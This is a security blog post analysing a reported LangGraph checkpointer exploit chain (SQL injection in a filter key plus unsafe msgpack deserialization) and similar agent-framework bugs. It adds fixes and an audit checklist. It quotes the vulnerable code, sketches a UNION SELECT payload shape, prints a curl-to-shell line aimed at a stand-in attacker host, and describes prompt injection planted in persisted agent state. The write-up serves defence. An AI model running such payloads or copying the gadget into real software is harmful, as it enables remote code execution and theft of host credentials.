---
title: "No Tools Required: RCE Through Agent State Persistence"
date: 2026-08-25
tags: ["AI Agents", "Architecture", "Developer Tools", "Prompt Engineering"]
description: "Check Point's Black Hat 2026 research turns prompt injection into RCE through agent checkpointers. No tool call involved — the state layer is unaudited."
author: "Replyant"
---

On June 11, 2026, Check Point Research published [the full LangGraph checkpointer chain](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) — author Yarden Porat — and it reads like a 2005 web-app pentest report. CVE-2025-67644: SQL injection in the SQLite checkpointer, because `_metadata_predicate()` interpolates a caller-supplied filter key directly into a JSON path inside a `WHERE` clause. CVE-2026-27022: the same injection class in the Redis checkpointer. CVE-2026-28277: unsafe msgpack deserialization, where the extension hook is a general-purpose `import → getattr → call` primitive. Chain them and a poisoned `filter` dictionary forges a checkpoint row, the framework's own deserializer reconstructs it on the next read, and `("os", "system", "…")` becomes a shell. Two months later, at Black Hat USA 2026 on August 5, Porat and Shahar Tal presented ["No Tools Required: Post-Injection Exploitation Across AI Agent Frameworks"](https://www.theregister.com/security/2026/08/05/prompt-injection-isnt-the-bug-ai-agent-frameworks-are/5283585) and showed the same shape in Microsoft Agent Framework and Google ADK. Not one of these exploits required the agent to call a tool.

**Tool permissioning secures the output side of the agent loop. Nobody is securing the state side.** The moment a framework persists agent state for resumability — and every production framework does, because long-running, multi-turn, human-in-the-loop agents are impossible without it — that persistence layer becomes a second trust boundary. It is almost never audited as one. Injected content sits inert in serialized state across a session boundary and detonates later, when a different actor resumes or rewinds that session and the framework's own deserializer reconstructs the payload as part of normal operation.

---

## What is post-injection exploitation?

Post-injection exploitation is the class of attack where injected text does no work in the current turn. It is written into durable agent state — a checkpoint, a session record, a memory row — and the exploit fires on a later read, inside framework code that never treated stored state as untrusted input. The model is not jailbroken, no tool is invoked, and no policy is bypassed at inference time. The vulnerability is in the persistence layer.

That distinction is what separates this research from our coverage of [Semantic Kernel's prompt-injection RCE](/lab/prompts-as-shells-rce/). There, the injected prompt reached an interpreter through the **tool registry**: the model emitted a structured call, and the tool implementation compiled it to native code. Every mitigation in that post — audit registered functions, bound the tool surface, sandbox execution — is an output-side control. It does nothing here. In the checkpointer chain, the model never emits anything. The attacker's text is data the framework wrote down and later read back.

---

## The chain: from a filter dict to `os.system`

Start with the injection. LangGraph's SQLite checkpointer builds its metadata `WHERE` clause by string interpolation:

```python
# VULNERABLE: langgraph-checkpoint-sqlite, _metadata_predicate()
# `query_key` comes from the caller-supplied `filter` dict and lands
# inside a QUOTED JSON path — so one apostrophe ends the literal and
# everything after it is parsed as SQL.
def _metadata_predicate(self, filter: dict[str, Any]) -> tuple[str, list]:
    clauses, params = [], []
    for query_key, query_value in filter.items():
        operator, param = _get_predicate(query_value)
        clauses.append(
            f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
        )
        params.append(param)
    return " AND ".join(clauses), params
```

The bound parameter is the *value*. The *key* is concatenated. That inversion is the whole bug, and it is reachable from `get_state_history()` — the time-travel API — whenever an application lets a user, a tool result, or a retrieved document influence the filter it passes down.

```python
# The filter key stops being a key and becomes a SQL fragment.
# Shape of the payload, not a working exploit:
malicious_filter = {
    "x') = 'y' UNION SELECT <forged checkpoint row with attacker BLOB> --": "…",
}
graph.get_state_history(config, filter=malicious_filter)
```

`UNION SELECT` returns a forged checkpoint row whose `checkpoint` BLOB the attacker controls. Now the second half of the chain runs on its own, because reading a checkpoint means deserializing it:

```python
# The read path: type tag + blob, straight into the serializer.
self.serde.loads_typed((type, checkpoint))
# -> for the "msgpack" type:
ormsgpack.unpackb(data_, ext_hook=self._unpack_ext_hook)
```

And the extension hook, whose job is reconstructing non-primitive Python objects, is an unrestricted remote-object-construction primitive:

```python
# VULNERABLE: this is "import anything, getattr anything, call it with
# an attacker-chosen argument" — the classic pickle-equivalent gadget,
# reached without pickle ever being involved.
return getattr(importlib.import_module(tup[0]), tup[1])(tup[2])

# tup = ("os", "system", "curl https://attacker.tld/x | sh")
```

Three ordinary bugs, none novel, composing into remote code execution on the host that runs the agent. Fixed in `langgraph-checkpoint-sqlite` >= 3.0.1, `langgraph` >= 1.0.10, and `langgraph-checkpoint-redis` >= 1.0.2. Check Point notes that LangSmith Deployment, which uses PostgreSQL, was not affected by the SQLite path.

---

## Why did a persistence layer become attacker-reachable?

Because resumability inverted the data flow and nobody re-drew the trust diagram. State stores were designed when the only writer was the framework itself and the only reader was the same process, seconds later. Agents broke both assumptions: the *content* of state is now attacker-influenced text, the *reader* is a different session or user, and the read path runs deserialization, SQL construction, and URL fetching on that content — as trusted framework logic.

This is why the bug classes are twenty years old. SQL injection, unsafe deserialization, SSRF, path traversal: these are solved problems in web frameworks precisely because the request boundary was recognized as hostile and every subsequent layer was written defensively. The agent persistence layer never got that recognition. It was built as internal plumbing, and internal plumbing does not get parameterized queries or allowlisted deserializers.

Tal's framing of the systemic risk is the part worth internalizing: "A bug in an agent framework isn't a bug in one product." A checkpointer flaw is inherited by every application built on the framework, most of which have no idea the persistence layer exists as anything but a `checkpointer=` argument.

---

## Tool-permissioning era vs. state-persistence era

The two eras demand different controls, and the second set is not a superset of the first — they defend different halves of the loop.

| Dimension | Tool-permissioning era | State-persistence era |
|---|---|---|
| Threat | Model is steered into an unsafe call | Injected bytes are stored, then reconstructed as code |
| Where the payload lives | The context window, this turn | Checkpoint rows, session records, serialized blobs |
| Trust boundary | Model output → tool dispatcher | State store → framework deserializer |
| Typical control | Allowlists, approval gates, scoped credentials | None. The store is treated as internal |
| Fails when | The tool itself is over-powered | Stored state is read back by anyone, ever |
| Blast radius | One session, one tool's authority | Every actor who resumes, rewinds, or shares that thread |
| Detection signal | Anomalous tool call in the trace | Nothing. There is no tool call to log |
| Plant-to-detonation gap | Milliseconds | Hours to months, across a session boundary |

The bottom two rows are the operational problem. Your agent observability stack is built around the tool-call trace, and this attack produces no tool call. It produces a successful checkpoint read.

---

## The same shape in three frameworks

Check Point did not find one bug; they found a pattern. Aggregate counts differ by source — The Register's account of the talk counts 11 vulnerabilities across six frameworks, including LangChain, CrewAI, and AutoGen alongside the three below, while Check Point's own Black Hat listing and several write-ups give a higher CVE count over fewer frameworks. Treat the number as unsettled and the pattern as settled.

**Microsoft Agent Framework** carried a critical checkpoint deserialization bug leading to remote code execution — the same primitive as CVE-2026-28277, in a different vendor's persistence layer. Microsoft paid a $10,000 bounty. No CVE was issued, because the framework was not a generally available product at disclosure time. The exploitation path is the one that should change how you think about session sharing: a payload planted in one person's message detonates when a *different* user rewinds their own session and the framework rebuilds the stored object, handing the attacker a shell on the server. Nobody's prompt did anything malicious at the moment of execution.

**Google ADK** failed differently but on the same boundary. A built-in development assistant that can write files stayed reachable over the HTTP API even though it was hidden from the app listing, with no authentication by default. Because `adk deploy cloud_run` publishes that same API, a default Cloud Run deployment exposes it without credentials. Bounty: $3,133.70, with a partial fix issued. That one is a reminder that "hidden from the UI" and "removed from the attack surface" are unrelated properties — the same reasoning error behind [MCP tool poisoning](/lab/mcp-tool-poisoning/), where the metadata channel nobody renders is the channel the model actually reads.

---

## Why do context-window defenses miss this entirely?

Because they operate on the wrong artifact at the wrong time. [CaMeL's dual-LLM control/data separation](/lab/camel-dual-llm-defense/) is the strongest published answer to prompt injection, and it defends the **context window**: untrusted content is quarantined so it cannot become control flow for the model. It says nothing about what the orchestrator writes to disk afterward, or what happens when a serializer reads those bytes back in a process where no LLM is involved at all.

Same for guard layers. [GuardFall showed that string-matching guards fail](/lab/guardfall-shell-injection-agents/) because the guard inspects text while the shell executes meaning. The state layer is that failure with an added time axis: the guard inspects a message at write time, when it is inert and harmless, while the deserializer executes its meaning on a later read, in a different session, possibly for a different user. Sanitizing at ingest cannot help you when the dangerous transformation happens on egress from your own database.

The closest sibling in our archive is [memory poisoning](/lab/memory-poisoning/) — identical delayed-detonation shape, different storage layer. There, the poisoned entry is retrieved and re-enters the model's context as instructions; the payload targets the *model*. In the checkpointer chain, the poisoned entry is deserialized and re-enters the *interpreter*; the payload targets the runtime. Memory poisoning gets you a misbehaving agent. State-persistence exploitation gets you the host.

---

## How do you fix a checkpointer?

Two changes, both boring, both twenty years old. First, never concatenate a caller-supplied identifier into SQL — bind the JSON path as a parameter and validate the key shape independently. Second, make deserialization a closed set: an allowlist of constructible types, plus an integrity check so a row your process did not write never reaches the deserializer at all.

```python
import hmac, hashlib, importlib, re, os
import ormsgpack

_SAFE_KEY = re.compile(r"^[A-Za-z0-9_]{1,64}$")


def metadata_predicate(filter: dict) -> tuple[str, list]:
    clauses, params = [], []
    for query_key, query_value in filter.items():
        # FIX 1a: the key is an identifier, so validate it as one.
        if not _SAFE_KEY.match(query_key):
            raise ValueError(f"illegal metadata key: {query_key!r}")
        operator, param = _get_predicate(query_value)
        # FIX 1b: the JSON path is now a BOUND VALUE, not concatenated text.
        clauses.append(f"json_extract(CAST(metadata AS TEXT), ?) {operator}")
        params.extend(["$." + query_key, param])
    return " AND ".join(clauses), params


# FIX 2a: an explicit, tiny allowlist. Anything not on it is a bug report,
# not a fallback. `os.system` is not on it, and neither is anything that
# can reach it.
ALLOWED_TYPES = {
    ("collections", "deque"),
    ("datetime", "datetime"),
    ("datetime", "timezone"),
    ("decimal", "Decimal"),
    ("uuid", "UUID"),
}


def safe_ext_hook(code: int, data: bytes):
    module, name, arg = ormsgpack.unpackb(data, ext_hook=safe_ext_hook)
    if (module, name) not in ALLOWED_TYPES:
        raise ValueError(f"refusing to construct {module}.{name}")
    return getattr(importlib.import_module(module), name)(arg)


# FIX 2b: integrity BEFORE deserialization. A forged row injected via SQLi
# has no valid tag, so the gadget is never reached — this is the control
# that holds even if a new injection sink appears tomorrow.
_KEY = os.environ["CHECKPOINT_HMAC_KEY"].encode()


def seal(blob: bytes) -> bytes:
    return hmac.new(_KEY, blob, hashlib.sha256).digest() + blob


def open_sealed(sealed: bytes) -> object:
    tag, blob = sealed[:32], sealed[32:]
    if not hmac.compare_digest(tag, hmac.new(_KEY, blob, hashlib.sha256).digest()):
        raise ValueError("checkpoint failed integrity check")
    return ormsgpack.unpackb(blob, ext_hook=safe_ext_hook)
```

The HMAC step is the one to argue for internally, because it is the only control on that list that is not bug-specific. Allowlists and parameterized queries fix the sinks you know about. An integrity tag verified before any parsing means an attacker who finds tomorrow's injection sink still cannot get a payload past the read path, because they cannot forge a row your process would accept.

---

## Blast radius: shared state is shared compromise

A single agent with a private thread has one detonation site. [Multi-agent systems](/lab/multi-agent-systems/) have as many as they have readers. Shared scratchpads, handoff envelopes, supervisor state, and replayed sub-agent transcripts all mean one agent's poisoned write is deserialized in another agent's process — often one with different credentials and a different privilege level. Delegation amplifies the same way it amplifies everything else: the payload travels with the state, and the state is the coordination mechanism.

Once execution lands, the [agent identity attack surface](/lab/agent-identity-attack-surface/) problem takes over. A shell on the orchestrator host holds whatever that process holds: environment API keys, cloud service-account credentials, the database handle, and — as the Google ADK finding shows — sometimes an unauthenticated HTTP API that was never meant to be public. The persistence bug is the entry; ambient authority is what makes it a breach.

---

## The Monday-morning audit

1. **Patch the known chain first.** `langgraph-checkpoint-sqlite` >= 3.0.1, `langgraph` >= 1.0.10, `langgraph-checkpoint-redis` >= 1.0.2. If you run Microsoft Agent Framework or Google ADK, take the current releases and re-check ADK's exposed HTTP surface yourself — the ADK fix was partial.
2. **Grep every state-store read path for string-built SQL.** Search your checkpointer, memory store, and session store dependencies for f-strings and `%`/`+` concatenation inside query construction. Keys are as dangerous as values; most code parameterizes only values.
3. **Enumerate who can influence a `filter`, `thread_id`, `checkpoint_ns`, or `namespace`.** If any of them can be shaped by a user, a tool result, or a retrieved document, treat that parameter as a request boundary and validate its shape, not just its type.
4. **Inventory every deserializer that touches persisted state.** pickle, msgpack ext hooks, `yaml.load`, custom `__reduce__` handlers, JSON revivers. Convert each to a closed allowlist, and make the default branch raise rather than construct.
5. **Sign your state at rest.** HMAC the serialized blob with a server-held key and verify before parsing. This is a one-afternoon change that neutralizes forged rows from injection sinks you have not found yet.
6. **Close the network path to the store.** Checkpointer Redis and Postgres instances should be reachable only from the orchestrator, with least-privilege credentials — no `DROP`, no cross-tenant read.
7. **Audit expose-by-default admin surfaces.** For every framework you deploy, list the HTTP routes it serves without your app registering them, then confirm authentication on each. Hidden from a UI listing is not removed.
8. **Isolate state per tenant and per trust level.** Separate databases or separate key namespaces, so a poisoned thread cannot be resumed, rewound, or listed by another tenant's process.
9. **Log checkpoint reads as security events.** Record thread ID, actor, requesting session, and deserialized type names on every restore. This is the only telemetry that catches an attack with no tool call in it.
10. **Add a resume/rewind case to your red-team suite.** Plant benign marker content in turn one, end the session, resume it as a different user, and assert the marker never reaches a constructor, a query, or an outbound request.
